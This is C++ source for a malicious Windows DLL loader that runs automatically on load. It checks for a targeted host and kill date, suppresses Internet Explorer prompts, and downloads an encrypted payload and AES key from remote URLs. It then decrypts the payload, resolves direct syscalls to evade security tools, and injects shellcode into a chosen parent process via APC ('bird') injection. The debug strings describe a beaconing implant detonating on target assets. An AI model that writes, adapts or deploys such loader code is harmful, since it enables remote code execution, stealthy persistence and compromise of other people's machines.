#include "Downloader.h"
#include "AES.h"
#include "Helpers.h"
#include "Syscalls.h"
#include "Injector.h"
#include "SafetyMeasures.h"
#include "Config.h"

// Call after DLL is loaded
// ------------------------------------------------------------------------

void go() {
	// [DEBUG]
	//OutputDebugStringA("[DBG] Paving the way for arrival of Stage-1 Beaconing payload!");

    // Perform implant safety checks
    if (!check_mutex() || !validate_endpoint() || !check_killdate()) {
    	//OutputDebugStringA("[DBG] Detonated in non-targeted asset!");
    	return;
    }
    //OutputDebugStringA("[DBG] Detonated in targeted asset!");

	// Suppress IE first use prompt
	if(!disable_ie_prompt()) {
		//OutputDebugStringA("[DBG] IE disable prompt failed!");
		return;
	}
	//OutputDebugStringA("[DBG] Suppressed IE first-use prompt!");

    // Fetch payload over network using IE COM object
    std::string payloadUrl = decrypt_string(PAYLOAD_URL);
	std::string ciphertext = download_to_mem_com((LPSTR)payloadUrl.c_str());
	if (ciphertext == "") {
		//OutputDebugStringA("[DBG] Failed to fetch payload!");
		return;
	}
	//OutputDebugStringA("[DBG] Fetched payload over network using IE COM object!");

	// Fetch AES Network Key
	std::string aesKeyUrl = decrypt_string(AES_KEY_URL);
	std::string aesKey = download_to_mem_com((LPSTR)aesKeyUrl.c_str());
	if (aesKey == "") {
		//OutputDebugStringA("[DBG] Failed to fetch AES Key!");
		return;
	}
	//OutputDebugStringA("[DBG] Fetched AES Key over network using IE COM object!");

	// Separate IV from ciphertext
	std::string iv = ciphertext.substr(ciphertext.length()-32);
	std::string payloadEncHex = ciphertext.substr(0, ciphertext.find(iv));

	// Convert encrypted payload hex string & iv to byte blob
	std::string payloadEnc = hex_to_byte_string(payloadEncHex);
	iv = hex_to_byte_string(iv);

	// Decrypt the payload
	if (!aes_decrypt(payloadEnc, iv, (LPSTR)aesKey.c_str())) {
		//OutputDebugStringA("[DBG] Unable to decrypt payload!");
		return;
	}
	//OutputDebugStringA("[DBG] Payload decrypted successfully!");

    // Convert decrypted payload hex string to byte blob
	std::string payloadByte = hex_to_byte_string(payloadEnc);

	// [DEBUG]
	//std::string debug = "[DBG] Payload length: " + std::to_string(payloadByte.length());
	//OutputDebugStringA(debug.c_str());

    // Resolve the direct syscalls
	if (!resolve_syscalls()) {
		//OutputDebugStringA("[DBG] Failed to resolve syscalls!");
		return;
	}
	//OutputDebugStringA("[DBG] Syscalls resolved!");

    // Prep the payload for injection
	LPSTR payload = (LPSTR)payloadByte.c_str();
	SIZE_T payloadLen = payloadByte.length();
	std::string parentProcess = decrypt_string(PARENT_PROCESS);
	DWORD pid = find_pid(parentProcess.c_str());

    // Do injection
	if (!advanced_bird_injection(payload, payloadLen, pid)) {
		//OutputDebugStringA("[DBG] Injection failed!");
		return;
	}
	//OutputDebugStringA("[DBG] Injection successful!");
}

// DllMain
// ------------------------------------------------------------------------

BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpvReserved) {
	HANDLE threadHandle;
	DWORD dwThread;

	switch (fdwReason) {
	case DLL_PROCESS_ATTACH:
		// Init Code here
		go();
		break;

	case DLL_THREAD_ATTACH:
		// Thread-specific init code here
		break;

	case DLL_THREAD_DETACH:
		// Thread-specific cleanup code here
		break;

	case DLL_PROCESS_DETACH:
		// Cleanup code here
		break;
	}

	// The return value is used for successful DLL_PROCESS_ATTACH
	return TRUE;
}